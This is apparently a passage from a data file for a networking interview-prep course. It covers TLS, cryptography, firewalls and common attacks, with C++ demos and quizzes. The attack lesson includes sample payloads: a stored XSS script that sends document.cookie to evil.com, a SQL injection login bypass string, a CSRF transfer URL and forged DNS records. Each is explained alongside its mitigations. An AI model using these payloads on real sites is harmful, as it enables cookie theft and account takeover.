          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every online banking transaction, trading order, and password is protected by <b>TLS encryption</b>. A misconfigured TLS deployment exposes sensitive data. <b>Firewalls</b> are the first line of defense — misconfigured rules can block legitimate traffic or allow unauthorized access. Understanding TLS handshakes, forward secrecy, and firewall filtering is non-negotiable for SDE roles in financial systems.</p></div><div class="learn-section"><div class="learn-h">Cryptography Fundamentals</div><p class="learn-p">Network security relies on <b>cryptography</b> to provide: <b>Confidentiality</b> (data unreadable by unauthorized parties), <b>Integrity</b> (data not tampered with), <b>Authentication</b> (verify identity), and <b>Non-repudiation</b> (sender cannot deny sending). These are sometimes abbreviated as <b>CIAN</b>.</p></div><div class="learn-section"><div class="learn-h">Symmetric vs Asymmetric Encryption</div><table class="learn-table"><tr><th>Feature</th><th>Symmetric Encryption</th><th>Asymmetric Encryption</th></tr><tr><td>Keys</td><td>Single shared secret key</td><td>Public key + Private key pair</td></tr><tr><td>Speed</td><td>Fast (100-1000x faster)</td><td>Slow (computationally expensive)</td></tr><tr><td>Key Distribution</td><td>Problem: how to share key securely?</td><td>Public key shared openly</td></tr><tr><td>Algorithms</td><td>AES, DES, 3DES, ChaCha20</td><td>RSA, ECC, Diffie-Hellman, ECDHE</td></tr><tr><td>Use Case</td><td>Bulk data encryption</td><td>Key exchange, digital signatures</td></tr></table><div class="learn-code">Symmetric: E(key, plaintext) = ciphertext\n           D(key, ciphertext) = plaintext\n           Same key for both!\n\nAsymmetric: E(public_key, plaintext) = ciphertext\n            D(private_key, ciphertext) = plaintext\n            OR\n            Sign(private_key, message) = signature\n            Verify(public_key, message, signature) = true/false</div><div class="learn-tip"><b>Tip:</b> TLS uses <b>both</b>: asymmetric encryption (RSA/ECDHE) for the key exchange during handshake, then symmetric encryption (AES/ChaCha20) for actual data transfer. This is called a <b>hybrid cryptosystem</b>.</div></div><div class="learn-section"><div class="learn-h">Diffie-Hellman Key Exchange</div><p class="learn-p">The <b>Diffie-Hellman (DH)</b> algorithm solves the fundamental problem of key distribution: how can two parties agree on a shared secret over an insecure channel?</p><div class="learn-code">Public parameters (known to everyone): prime p, generator g\n\nAlice:                              Bob:\n1. Pick private a (secret)          1. Pick private b (secret)\n2. Compute A = g^a mod p             2. Compute B = g^b mod p\n3. Send A to Bob    ──────────▶      3. Send B to Alice\n4. Receive B        ◀──────────      4. Receive A\n5. Compute: s = B^a mod p           5. Compute: s = A^b mod p\n\nBoth get: s = g^(ab) mod p  ← SAME shared secret!\n\nEavesdropper sees: p, g, A, B — but computing a or b from these\nis the Discrete Logarithm Problem (computationally infeasible).</div><p class="learn-p"><b>Worked example:</b> p=23, g=5. Alice picks a=6: A = 5^6 mod 23 = 8. Bob picks b=15: B = 5^15 mod 23 = 19. Alice computes: 19^6 mod 23 = 2. Bob computes: 8^15 mod 23 = 2. Shared secret = 2.</p><p class="learn-p"><b>ECDHE (Elliptic Curve Diffie-Hellman Ephemeral):</b> Uses elliptic curve math instead of modular exponentiation. Provides the same security with much smaller key sizes (256-bit ECC ≈ 3072-bit RSA). The <b>E</b> (Ephemeral) means new keys are generated per session, providing <b>forward secrecy</b>.</p><div class="learn-warn"><b>Limitation:</b> DH alone provides no authentication — it is vulnerable to <b>Man-in-the-Middle</b> attacks. An attacker can intercept and establish separate DH exchanges with each party. TLS solves this by combining DH with certificate-based authentication (digital signatures).</div></div><div class="learn-section"><div class="learn-h">Hashing</div><p class="learn-p">A <b>hash function</b> maps arbitrary-length input to a fixed-length output (digest). Properties of cryptographic hash functions:</p><ul class="learn-list"><li><b>Deterministic:</b> Same input always produces same output.</li><li><b>Pre-image resistance:</b> Given hash H, hard to find input M such that hash(M) = H.</li><li><b>Collision resistance:</b> Hard to find two inputs M1 and M2 where hash(M1) = hash(M2).</li><li><b>Avalanche effect:</b> Small change in input causes drastically different output.</li></ul><table class="learn-table"><tr><th>Algorithm</th><th>Output Size</th><th>Status</th></tr><tr><td>MD5</td><td>128 bits</td><td>Broken (collisions found). Do NOT use for security.</td></tr><tr><td>SHA-1</td><td>160 bits</td><td>Deprecated (collisions demonstrated in 2017).</td></tr><tr><td>SHA-256</td><td>256 bits</td><td>Secure. Widely used (TLS, Bitcoin, etc.).</td></tr><tr><td>SHA-3</td><td>Variable</td><td>Secure. Different construction (Keccak).</td></tr></table><p class="learn-p"><b>HMAC (Hash-based Message Authentication Code):</b> Combines a hash function with a secret key to provide both integrity and authentication. <code>HMAC(key, message) = hash(key XOR opad || hash(key XOR ipad || message))</code>.</p></div><div class="learn-section"><div class="learn-h">Digital Certificates and PKI</div><p class="learn-p">A <b>digital certificate</b> binds a public key to an identity (domain name, organization). It is signed by a <b>Certificate Authority (CA)</b>. The browser trusts a set of root CAs; the CA vouches for the server\'s identity.</p><div class="learn-code">Certificate Chain:\n  Root CA (self-signed, pre-installed in browser/OS)\n    |\n    +-- Intermediate CA (signed by Root CA)\n          |\n          +-- Server Certificate for www.example.com\n              (signed by Intermediate CA)\n              Contains: domain name, public key, validity period,\n                        issuer, serial number, signature\n\nVerification:\n1. Browser receives server cert\n2. Checks cert is valid (not expired, domain matches)\n3. Follows chain to a trusted root CA\n4. Verifies each signature in the chain</div></div><div class="learn-section"><div class="learn-h">SSL/TLS In-Depth</div><p class="learn-p"><b>SSL (Secure Sockets Layer)</b> is deprecated (SSL 2.0 and 3.0 are insecure). <b>TLS (Transport Layer Security)</b> is the modern successor. TLS 1.2 and TLS 1.3 are the current standards.</p><p class="learn-p"><b>TLS 1.2 Handshake (detailed):</b></p><ol class="learn-list"><li><b>ClientHello:</b> Client sends: TLS version, supported cipher suites, client random (32 bytes), session ID, extensions (SNI, etc.).</li><li><b>ServerHello:</b> Server selects cipher suite, sends server random.</li><li><b>Certificate:</b> Server sends its certificate chain.</li><li><b>ServerKeyExchange:</b> (For ECDHE) Server sends DH parameters + signature.</li><li><b>ServerHelloDone:</b> Server indicates hello phase complete.</li><li><b>ClientKeyExchange:</b> Client sends its DH public value (or RSA-encrypted pre-master secret).</li><li><b>ChangeCipherSpec:</b> Both sides switch to encrypted communication.</li><li><b>Finished:</b> Both send encrypted verification of the handshake.</li></ol><p class="learn-p"><b>TLS 1.3 improvements:</b></p><ul class="learn-list"><li>Handshake reduced to <b>1-RTT</b> (from 2-RTT in TLS 1.2). Supports <b>0-RTT</b> resumption.</li><li>Removed insecure algorithms: RSA key exchange (no forward secrecy), CBC mode ciphers, SHA-1, MD5, RC4, DES, 3DES.</li><li>Only supports <b>AEAD</b> ciphers: AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305.</li><li><b>Forward secrecy</b> is mandatory (ECDHE only).</li></ul><div class="learn-warn"><b>Warning:</b> <b>Forward secrecy</b> means that compromising the server\'s long-term private key does NOT allow decryption of past sessions. ECDHE provides this because ephemeral keys are used per session. RSA key exchange does NOT provide forward secrecy (which is why TLS 1.3 removed it).</div></div><div class="learn-section"><div class="learn-h">Firewalls</div><p class="learn-p">A <b>firewall</b> monitors and controls incoming/outgoing network traffic based on predefined security rules. Types:</p><table class="learn-table"><tr><th>Type</th><th>Layer</th><th>Description</th></tr><tr><td>Packet Filter</td><td>L3/L4</td><td>Filters based on IP addresses, ports, protocols. Stateless — examines each packet independently.</td></tr><tr><td>Stateful Firewall</td><td>L3/L4</td><td>Tracks connection state (TCP states). Allows return traffic for established connections. More secure than stateless.</td></tr><tr><td>Application Firewall (WAF)</td><td>L7</td><td>Inspects application-layer data (HTTP headers, payloads). Can block SQL injection, XSS, etc.</td></tr><tr><td>Next-Gen Firewall (NGFW)</td><td>L3-L7</td><td>Combines stateful inspection, deep packet inspection, IPS, application awareness.</td></tr></table><div class="learn-code">Firewall Rule Example (iptables-style):\n\n# Allow incoming HTTP and HTTPS\nALLOW  TCP  ANY -&gt; 80   (HTTP)\nALLOW  TCP  ANY -&gt; 443  (HTTPS)\n\n# Allow outgoing DNS\nALLOW  UDP  ANY -&gt; 53   (DNS queries)\n\n# Allow established/related connections\nALLOW  TCP  ESTABLISHED,RELATED\n\n# Block everything else\nDENY   ALL  ANY -&gt; ANY  (default deny)</div></div><div class="learn-section"><div class="learn-h">VPN (Virtual Private Network)</div><p class="learn-p">A VPN creates a <b>secure, encrypted tunnel</b> over a public network (Internet). Types:</p><ul class="learn-list"><li><b>IPSec VPN:</b> Operates at Layer 3. Two modes: <b>Transport</b> (encrypts payload only) and <b>Tunnel</b> (encrypts entire IP packet, adds new IP header). Uses ESP and AH protocols.</li><li><b>SSL/TLS VPN:</b> Operates at Layer 4-7. Uses HTTPS (port 443). Easier to deploy (works through firewalls). Examples: OpenVPN, WireGuard.</li></ul></div><div class="learn-section"><div class="learn-h">IDS/IPS</div><p class="learn-p"><b>IDS (Intrusion Detection System):</b> Monitors network traffic for suspicious patterns and alerts administrators. Passive — does not block traffic.</p><p class="learn-p"><b>IPS (Intrusion Prevention System):</b> Like IDS but <b>actively blocks</b> detected threats. Sits inline in the network path.</p><p class="learn-p">Detection methods: <b>Signature-based</b> (known attack patterns), <b>Anomaly-based</b> (deviations from baseline), <b>Heuristic</b> (behavioral analysis).</p></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: TLS 1.2 handshake steps?</b><br>A: (1) ClientHello: cipher suites, TLS version, client_random. (2) ServerHello: selected suite, server_random. (3) Certificate chain. (4) ServerKeyExchange: ECDHE params + signature. (5) ClientKeyExchange: client ECDHE public value. (6) Both compute shared secret, derive session keys. (7) ChangeCipherSpec + Finished. Total: 2 RTTs.</p><p class="learn-p"><b>Q2: What is forward secrecy?</b><br>A: Compromising the server\'s long-term private key does NOT decrypt past sessions. ECDHE achieves this — ephemeral keys per session are discarded. TLS 1.3 removed RSA key exchange (no forward secrecy) and mandates ECDHE only.</p><p class="learn-p"><b>Q3: Why does TLS use both symmetric and asymmetric encryption?</b><br>A: Asymmetric (RSA/ECDH): solves key distribution but slow. Symmetric (AES): fast but needs shared key. TLS uses asymmetric for handshake (key exchange + auth), symmetric for bulk data. Best of both worlds.</p><p class="learn-p"><b>Q4: Stateful firewall vs WAF?</b><br>A: Stateful firewall (L3/L4): tracks TCP states, filters by IP/port/connection state. WAF (L7): inspects HTTP content, blocks SQL injection, XSS, app-specific attacks. WAF understands HTTP semantics.</p><p class="learn-p"><b>Q5: Why is MD5 broken?</b><br>A: Practical collision attacks exist — two different inputs producing same hash. Breaks digital signatures and certificate verification. Use SHA-256. For passwords, use bcrypt/scrypt/Argon2 (salting + intentional slowness).</p><p class="learn-p"><b>Q6: How does certificate chain verification work?</b><br>A: Browser: (1) checks domain matches cert, (2) not expired, (3) verifies signature using intermediate CA\'s public key, (4) verifies intermediate via Root CA, (5) confirms Root CA is in trusted store. Any failure shows security warning.</p></div>',
          code: `// === Cryptography & Security Demonstrations in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <iomanip>
#include <cstring>
using namespace std;

// ---- Simple Caesar Cipher (Symmetric) ----
string caesarEncrypt(const string& plaintext, int shift) {
    string ciphertext;
    for (char c : plaintext) {
        if (isalpha(c)) {
            char base = isupper(c) ? 'A' : 'a';
            ciphertext += (char)((c - base + shift) % 26 + base);
        } else {
            ciphertext += c;
        }
    }
    return ciphertext;
}

string caesarDecrypt(const string& ciphertext, int shift) {
    return caesarEncrypt(ciphertext, 26 - shift);
}

// ---- XOR Cipher (simple symmetric) ----
string xorCipher(const string& data, const string& key) {
    string result;
    for (size_t i = 0; i < data.size(); i++) {
        result += (char)(data[i] ^ key[i % key.size()]);
    }
    return result;
}

// ---- Simple Hash Function (DJB2) ----
uint32_t djb2Hash(const string& str) {
    uint32_t hash = 5381;
    for (char c : str) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

void demonstrateHashing() {
    cout << "=== Hashing Demonstration ===" << endl;
    vector<string> inputs = {
        "hello", "Hello", "hello!", "hello world",
        "The quick brown fox"
    };
    for (auto& s : inputs) {
        cout << "  hash(\"" << s << "\") = 0x"
             << hex << setfill('0') << setw(8)
             << djb2Hash(s) << dec << endl;
    }
    // Demonstrate avalanche effect
    cout << "\\nAvalanche effect:" << endl;
    cout << "  hash(\"hello\") = 0x" << hex << djb2Hash("hello") << dec << endl;
    cout << "  hash(\"hellp\") = 0x" << hex << djb2Hash("hellp") << dec << endl;
}

// ---- RSA Key Generation (simplified, small numbers) ----
struct RSAKeys {
    long long n, e, d;  // public = (n, e), private = (n, d)
};

long long gcd(long long a, long long b) {
    return b == 0 ? a : gcd(b, a % b);
}

long long modPow(long long base, long long exp, long long mod) {
    long long result = 1;
    base %= mod;
    while (exp > 0) {
        if (exp & 1) result = (result * base) % mod;
        exp >>= 1;
        base = (base * base) % mod;
    }
    return result;
}

long long modInverse(long long a, long long m) {
    // Extended Euclidean
    long long m0 = m, y = 0, x = 1;
    if (m == 1) return 0;
    while (a > 1) {
        long long q = a / m;
        long long t = m;
        m = a % m;
        a = t;
        t = y;
        y = x - q * y;
        x = t;
    }
    if (x < 0) x += m0;
    return x;
}

RSAKeys generateRSA() {
    // Using small primes for demonstration
    long long p = 61, q = 53;
    long long n = p * q;               // 3233
    long long phi = (p - 1) * (q - 1); // 3120

    // Choose e (commonly 65537, but use 17 for small demo)
    long long e = 17;
    while (gcd(e, phi) != 1) e += 2;

    long long d = modInverse(e, phi);
    return {n, e, d};
}

void demonstrateRSA() {
    cout << "\\n=== RSA Encryption (Simplified) ===" << endl;
    RSAKeys keys = generateRSA();
    cout << "  Public Key:  (n=" << keys.n << ", e=" << keys.e << ")" << endl;
    cout << "  Private Key: (n=" << keys.n << ", d=" << keys.d << ")" << endl;

    long long message = 42;
    cout << "  Original message: " << message << endl;

    long long encrypted = modPow(message, keys.e, keys.n);
    cout << "  Encrypted: " << encrypted << endl;

    long long decrypted = modPow(encrypted, keys.d, keys.n);
    cout << "  Decrypted: " << decrypted << endl;

    // Digital signature
    long long signature = modPow(message, keys.d, keys.n);
    cout << "  Signature of " << message << ": " << signature << endl;
    long long verified = modPow(signature, keys.e, keys.n);
    cout << "  Verified: " << verified
         << (verified == message ? " (VALID)" : " (INVALID)") << endl;
}

// ---- TLS Handshake Simulation ----
void simulateTLSHandshake() {
    cout << "\\n=== TLS 1.2 Handshake Simulation ===" << endl;

    cout << "--- Step 1: ClientHello ---" << endl;
    cout << "  TLS Version: 1.2" << endl;
    cout << "  Cipher Suites: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ..."
         << endl;
    cout << "  Client Random: 0x" << hex << 0xABCDEF01 << dec << "..." << endl;
    cout << "  Extensions: SNI=www.example.com" << endl;

    cout << "--- Step 2: ServerHello ---" << endl;
    cout << "  Selected: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256" << endl;
    cout << "  Server Random: 0x" << hex << 0x12345678 << dec << "..." << endl;

    cout << "--- Step 3: Certificate ---" << endl;
    cout << "  Server cert: CN=www.example.com" << endl;
    cout << "  Issuer: Let's Encrypt Authority X3" << endl;
    cout << "  Valid: 2026-01-01 to 2026-12-31" << endl;

    cout << "--- Step 4: ServerKeyExchange (ECDHE) ---" << endl;
    cout << "  Curve: secp256r1" << endl;
    cout << "  Server ECDH Public Key: (Qx, Qy)" << endl;

    cout << "--- Step 5: ClientKeyExchange ---" << endl;
    cout << "  Client ECDH Public Key: (Rx, Ry)" << endl;
    cout << "  Shared secret computed via ECDH" << endl;

    cout << "--- Step 6: Key Derivation ---" << endl;
    cout << "  Pre-master secret -> Master secret (PRF)" << endl;
    cout << "  Master secret -> Session keys" << endl;
    cout << "    Client write key, Server write key" << endl;
    cout << "    Client write IV, Server write IV" << endl;

    cout << "--- Step 7: ChangeCipherSpec + Finished ---" << endl;
    cout << "  Both sides switch to encrypted communication" << endl;
    cout << "  ** TLS Handshake Complete! **" << endl;
    cout << "  All further data encrypted with AES-128-GCM" << endl;
}

// ---- Firewall Rule Engine ----
struct FirewallRule {
    string action;  // ALLOW or DENY
    string protocol; // TCP, UDP, ALL
    int dstPort;    // -1 for any
    string srcIP;   // "ANY" for any
};

class Firewall {
    vector<FirewallRule> rules;
public:
    void addRule(string action, string proto, int port, string src) {
        rules.push_back({action, proto, port, src});
    }

    string evaluate(string proto, string srcIP, int dstPort) {
        for (auto& rule : rules) {
            bool protoMatch = (rule.protocol == "ALL" || rule.protocol == proto);
            bool portMatch = (rule.dstPort == -1 || rule.dstPort == dstPort);
            bool srcMatch = (rule.srcIP == "ANY" || rule.srcIP == srcIP);
            if (protoMatch && portMatch && srcMatch) {
                return rule.action;
            }
        }
        return "DENY"; // default deny
    }
};

void demonstrateFirewall() {
    cout << "\\n=== Firewall Rule Engine ===" << endl;
    Firewall fw;
    fw.addRule("ALLOW", "TCP", 80, "ANY");
    fw.addRule("ALLOW", "TCP", 443, "ANY");
    fw.addRule("ALLOW", "UDP", 53, "ANY");
    fw.addRule("ALLOW", "TCP", 22, "10.0.0.0");
    fw.addRule("DENY", "ALL", -1, "ANY"); // default deny

    struct TestPacket { string proto; string src; int port; };
    vector<TestPacket> tests = {
        {"TCP", "1.2.3.4", 80},
        {"TCP", "1.2.3.4", 443},
        {"TCP", "1.2.3.4", 22},
        {"TCP", "10.0.0.0", 22},
        {"UDP", "5.5.5.5", 53},
        {"TCP", "1.2.3.4", 3306},
    };

    for (auto& t : tests) {
        string result = fw.evaluate(t.proto, t.src, t.port);
        cout << "  " << t.proto << " " << t.src << ":" << t.port
             << " -> " << result << endl;
    }
}

int main() {
    demonstrateHashing();
    demonstrateRSA();
    simulateTLSHandshake();
    demonstrateFirewall();
    return 0;
}`,
          problems: [
            ['Symmetric vs Asymmetric Encryption', 'https://www.geeksforgeeks.org/difference-between-symmetric-and-asymmetric-key-encryption/', 'Easy'],
            ['Firewall Types and Architecture', 'https://www.geeksforgeeks.org/types-of-firewall-and-possible-attacks/', 'Medium'],
            ['Digital Signatures & PKI', 'https://www.geeksforgeeks.org/digital-signatures-certificates/', 'Hard'],
            ['Firewall Configuration', 'https://www.geeksforgeeks.org/introduction-of-firewall-in-computer-network/', 'Medium']
          ],
          mcqs: [
            {q: 'TLS uses asymmetric encryption for:', o: ['Encrypting all data', 'Key exchange during handshake', 'Computing checksums', 'Compressing data'], a: 1},
            {q: 'Which TLS version removed RSA key exchange for mandatory forward secrecy?', o: ['TLS 1.0', 'TLS 1.1', 'TLS 1.2', 'TLS 1.3'], a: 3},
            {q: 'A stateful firewall differs from a packet filter firewall because it:', o: ['Operates at Layer 7', 'Tracks TCP connection states', 'Uses deep learning', 'Requires a VPN'], a: 1},
            {q: 'AES is:', o: ['Asymmetric encryption', 'Hash function', 'Symmetric encryption', 'Key exchange protocol'], a: 2},
            {q: 'ECDHE provides forward secrecy because:', o: ['Symmetric keys', 'Ephemeral keys generated per session', 'Longer key lengths', 'Certificate encryption'], a: 1},
            {q: 'WAF can block SQL injection because it operates at:', o: ['Layer 2', 'Layer 3/4', 'Layer 7 (Application)', 'Physical layer'], a: 2},
            {q: 'HMAC provides:', o: ['Encryption only', 'Integrity and authentication', 'Key generation', 'Address translation'], a: 1},
            {q: 'Digital certificates are issued by:', o: ['DNS Server', 'DHCP Server', 'Certificate Authority (CA)', 'Firewall'], a: 2}
          ],
        },
        {
          t: 'Common Attacks (DDoS, MITM, DNS Spoofing, XSS)',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">In 2016, the Mirai botnet\'s DDoS attack took down Twitter, Netflix, Reddit, and GitHub for hours. In 2023, BGP hijacks briefly rerouted financial institution traffic. Understanding network attacks is critical for building resilient systems. At a financial firm, a security breach means regulatory penalties, financial losses, and reputational damage. SDE interviews test attack vectors and mitigations, especially in system design.</p></div><div class="learn-section"><div class="learn-h">Network Attack Categories</div><p class="learn-p">Network attacks can be broadly classified into:</p><ul class="learn-list"><li><b>Passive attacks:</b> Eavesdropping, traffic analysis — attacker only observes, does not modify data.</li><li><b>Active attacks:</b> Modification, impersonation, replay, denial of service — attacker alters data or disrupts service.</li></ul><p class="learn-p">Understanding these attacks and their mitigations is crucial for system design interviews, where security is a key consideration for financial systems.</p></div><div class="learn-section"><div class="learn-h">DDoS (Distributed Denial of Service)</div><p class="learn-p">A <b>DDoS attack</b> floods a target with overwhelming traffic from many compromised machines (<b>botnet</b>), making the service unavailable to legitimate users.</p><p class="learn-p"><b>Types of DDoS attacks:</b></p><table class="learn-table"><tr><th>Type</th><th>Layer</th><th>Mechanism</th><th>Example</th></tr><tr><td>Volumetric</td><td>L3/L4</td><td>Flood bandwidth</td><td>UDP flood, ICMP flood, DNS amplification</td></tr><tr><td>Protocol</td><td>L3/L4</td><td>Exploit protocol weaknesses</td><td>SYN flood, Smurf attack, Ping of Death</td></tr><tr><td>Application</td><td>L7</td><td>Exhaust server resources</td><td>HTTP flood, Slowloris, RUDY</td></tr></table><p class="learn-p"><b>SYN Flood Attack:</b> Attacker sends many SYN packets with <b>spoofed source IPs</b>. The server allocates resources for each half-open connection (SYN_RCVD state) and sends SYN-ACK to the spoofed addresses. Since no ACK comes back, connections time out slowly, exhausting the server\'s connection table.</p><div class="learn-code">SYN Flood:\nAttacker --SYN(spoofed IP)--> Server\nAttacker --SYN(spoofed IP)--> Server\nAttacker --SYN(spoofed IP)--> Server\n... (thousands per second)\n\nServer\'s SYN queue fills up -> legitimate connections rejected\n\nMitigation:\n- SYN Cookies: Don\'t allocate state until ACK received.\n  Server encodes connection info in the ISN (sequence number).\n  On receiving ACK, reconstructs state from the cookie.\n- Rate limiting SYN packets\n- Increase SYN queue size / decrease timeout\n- IP reputation filtering</div><p class="learn-p"><b>DNS Amplification Attack:</b> Attacker sends small DNS queries with <b>spoofed source IP (victim\'s IP)</b> to open DNS resolvers. The resolvers send large responses to the victim. Amplification factor can be 50-70x.</p><div class="learn-code">DNS Amplification:\nAttacker (src IP spoofed as Victim) --> DNS Resolver\n   Query: "ANY record for large-domain.com" (60 bytes)\n\nDNS Resolver --> Victim\n   Response: 3000+ bytes of DNS records\n\nAmplification: 3000/60 = 50x !</div><p class="learn-p"><b>DDoS Mitigations:</b></p><ul class="learn-list"><li><b>CDN/DDoS protection services:</b> Cloudflare, AWS Shield, Akamai absorb traffic.</li><li><b>Rate limiting:</b> Limit requests per IP per second.</li><li><b>Anycast routing:</b> Distribute attack traffic across multiple data centers.</li><li><b>Traffic scrubbing:</b> Filter malicious traffic before it reaches the server.</li><li><b>Blackhole routing:</b> Send attack traffic to a null route (last resort).</li></ul></div><div class="learn-section"><div class="learn-h">MITM (Man-in-the-Middle) Attack</div><p class="learn-p">In a <b>MITM attack</b>, the attacker secretly intercepts and possibly alters communication between two parties who believe they are communicating directly with each other.</p><p class="learn-p"><b>Common MITM techniques:</b></p><ul class="learn-list"><li><b>ARP Spoofing/Poisoning:</b> Attacker sends fake ARP replies to associate their MAC address with the gateway\'s IP. All traffic from victims passes through the attacker.</li><li><b>Evil Twin Wi-Fi:</b> Attacker creates a rogue Wi-Fi access point with the same SSID as a legitimate one. Users unknowingly connect to the attacker\'s network.</li><li><b>SSL Stripping:</b> Attacker downgrades HTTPS to HTTP by intercepting the initial redirect. User sees HTTP (no padlock) but may not notice.</li><li><b>Session Hijacking:</b> Attacker steals session cookies (via XSS, sniffing) to impersonate the user.</li></ul><div class="learn-code">ARP Spoofing:\n\nNormal: Victim ARP table: Gateway IP -> Gateway MAC\nAttack: Attacker sends: "Gateway IP is at ATTACKER MAC"\n        Victim ARP table: Gateway IP -> ATTACKER MAC\n\nResult: All traffic from victim goes to attacker first.\n        Attacker forwards to real gateway (transparent proxy).\n        Attacker can read/modify all unencrypted traffic.\n\nMitigation:\n- Use HTTPS everywhere\n- Dynamic ARP Inspection (DAI) on switches\n- Static ARP entries for critical hosts\n- VPN for sensitive communication</div><div class="learn-warn"><b>Warning:</b> HTTPS with proper certificate validation is the primary defense against MITM. If the user ignores browser certificate warnings ("This connection is not secure"), they are vulnerable even with HTTPS.</div></div><div class="learn-section"><div class="learn-h">DNS Spoofing / DNS Cache Poisoning</div><p class="learn-p"><b>DNS Spoofing</b> involves providing false DNS responses to redirect users to malicious sites. <b>DNS Cache Poisoning</b> specifically targets the DNS resolver\'s cache.</p><div class="learn-code">DNS Cache Poisoning (Kaminsky Attack):\n\n1. Attacker queries resolver for random.example.com\n2. Resolver queries authoritative server for example.com\n3. Before real response arrives, attacker floods resolver with\n   forged responses claiming:\n   "random.example.com -> ATTACKER_IP"\n   AND "example.com NS -> attacker-ns.evil.com"\n4. If forged response matches transaction ID and arrives first,\n   resolver caches the poisoned NS record\n5. ALL future queries for *.example.com go to attacker\'s DNS\n\nMitigations:\n- DNSSEC: Cryptographically signs DNS records\n- Source port randomization (increases attack difficulty)\n- DNS over HTTPS (DoH) / DNS over TLS (DoT)\n- 0x20 encoding (randomize case in queries)</div></div><div class="learn-section"><div class="learn-h">XSS (Cross-Site Scripting)</div><p class="learn-p"><b>XSS</b> is a web application vulnerability where an attacker injects <b>malicious scripts</b> into web pages viewed by other users. While primarily a web security issue, understanding XSS is important for application-layer network security.</p><p class="learn-p"><b>Types of XSS:</b></p><table class="learn-table"><tr><th>Type</th><th>Description</th><th>Example</th></tr><tr><td>Stored (Persistent)</td><td>Malicious script stored in database, served to all visitors</td><td>Forum post with &lt;script&gt; tag</td></tr><tr><td>Reflected</td><td>Script in URL parameter, reflected back in response</td><td>Search query: &lt;script&gt;alert(1)&lt;/script&gt;</td></tr><tr><td>DOM-based</td><td>Script manipulates client-side DOM directly</td><td>JavaScript reads URL hash and injects into page</td></tr></table><div class="learn-code">Stored XSS Example:\n\n1. Attacker posts comment:\n   "Nice article! &lt;script&gt;fetch(\'https://evil.com/steal?\'+document.cookie)&lt;/script&gt;"\n\n2. Server stores comment in database.\n\n3. When other users view the page, the script runs\n   in their browser, stealing their cookies.\n\nMitigations:\n- Input validation and sanitization\n- Output encoding (HTML entity encoding)\n- Content-Security-Policy (CSP) header\n- HttpOnly flag on cookies (prevents JS access)\n- Use frameworks that auto-escape output (React, Angular)</div></div><div class="learn-section"><div class="learn-h">Other Important Attacks</div><p class="learn-p"><b>SQL Injection:</b> Attacker inserts malicious SQL into input fields. Example: <code>\' OR 1=1 --</code> in a login form bypasses authentication. Mitigation: parameterized queries (prepared statements), input validation, ORM usage.</p><p class="learn-p"><b>CSRF (Cross-Site Request Forgery):</b> Attacker tricks authenticated user into making unwanted requests. Example: embedded image tag with <code>src="https://bank.com/transfer?to=attacker&amp;amount=10000"</code>. Mitigation: CSRF tokens, SameSite cookies, Referer checking.</p><p class="learn-p"><b>Replay Attack:</b> Attacker captures a valid network message and retransmits it later. Mitigation: timestamps, nonces, sequence numbers in protocols.</p><p class="learn-p"><b>IP Spoofing:</b> Attacker forges the source IP in packets. Used in DDoS amplification and some MITM attacks. Mitigation: ingress filtering (BCP38), RPF (Reverse Path Forwarding) checks.</p></div><div class="learn-section"><div class="learn-h">Security Best Practices Summary</div><table class="learn-table"><tr><th>Threat</th><th>Defense</th></tr><tr><td>Eavesdropping</td><td>TLS/HTTPS, VPN, end-to-end encryption</td></tr><tr><td>DDoS</td><td>CDN, rate limiting, SYN cookies, scrubbing</td></tr><tr><td>MITM</td><td>HTTPS + HSTS, certificate pinning, VPN</td></tr><tr><td>DNS Spoofing</td><td>DNSSEC, DoH/DoT, port randomization</td></tr><tr><td>XSS</td><td>CSP, output encoding, HttpOnly cookies</td></tr><tr><td>SQL Injection</td><td>Parameterized queries, ORM, input validation</td></tr><tr><td>CSRF</td><td>CSRF tokens, SameSite cookies</td></tr><tr><td>Password theft</td><td>Bcrypt/Argon2 hashing, MFA, rate limiting</td></tr></table><div class="learn-tip"><b>Tip:</b> The defense-in-depth principle states that security should be layered. No single measure is sufficient — combine network security (firewalls, IDS), transport security (TLS), application security (input validation, CSP), and operational security (monitoring, incident response).</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: How does SYN flood work and how do SYN cookies help?</b><br>A: Attacker sends thousands of SYNs with spoofed IPs. Server allocates state for each half-open connection, filling SYN queue, blocking legitimate connections. SYN cookies: server encodes connection info in the ISN of SYN-ACK. No state allocated until ACK returns. No state = no queue exhaustion.</p><p class="learn-p"><b>Q2: How does ARP spoofing enable MITM?</b><br>A: Attacker sends fake ARP replies: "Gateway IP is at MY MAC." Victim\'s ARP cache is poisoned, all gateway traffic goes through attacker. Attacker forwards to real gateway (transparent proxy), reading/modifying unencrypted data. Mitigations: HTTPS, Dynamic ARP Inspection, VPN.</p><p class="learn-p"><b>Q3: Stored XSS vs reflected XSS?</b><br>A: Stored: malicious script saved in DB (e.g., forum comment), served to all viewers — broad impact. Reflected: script in URL parameter echoed in response — requires victim to click crafted link. Mitigations: output encoding, Content-Security-Policy, HttpOnly cookies.</p><p class="learn-p"><b>Q4: How does DNSSEC prevent cache poisoning?</b><br>A: DNSSEC cryptographically signs DNS records. Each response includes an RRSIG signature verified using the zone\'s DNSKEY, authenticated via chain of trust to the root. Forged responses lack valid signatures and are rejected.</p><p class="learn-p"><b>Q5: What is DNS amplification?</b><br>A: Small DNS queries (~60 bytes) sent to open resolvers with victim\'s spoofed IP. Resolvers send large responses (3000+ bytes) to victim. Amplification 50-70x. Effective because: UDP allows IP spoofing, resolvers respond to anyone, "ANY" queries generate huge responses.</p><p class="learn-p"><b>Q6: Why is defense-in-depth important?</b><br>A: No single measure is sufficient. Layer: network (firewalls, IDS), transport (TLS), application (validation, CSP, parameterized queries), data (encryption at rest), operational (monitoring, patching). If one layer fails, others still protect.</p></div>',
          code: `// === Network Attack Simulations in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <queue>
#include <cstdlib>
#include <ctime>
#include <algorithm>
using namespace std;

